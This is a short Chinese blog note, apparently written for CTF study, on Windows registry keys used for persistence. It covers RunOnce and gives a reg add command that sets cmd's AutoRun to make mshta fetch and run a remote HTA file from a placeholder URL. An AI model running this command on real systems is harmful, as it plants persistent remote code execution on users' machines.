---
title: 注册表项 
date: 2023-08-29 14:19:49
categories: CTF
tags: [Windows]
---

本文记录那些可以被用来权限维持以及信息探测的注册表项。

## 启动进程

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` 

用于指定那些只需要在下次系统启动时运行一次的程序或命令。与此位置相关的命令或程序在执行完一次后通常会从此列表中自动删除。 

## 下载并执行

```
reg add 'HKCU\Software\Microsoft\Command Processor' 
/v AutoRun /t REG_SZ /d 'mshta.exe' http:/exam/1.hta /f
```

 通过注册表设置命令行默认启动项，当目标启动cmd时，便会下载并执行远程hta文件。 

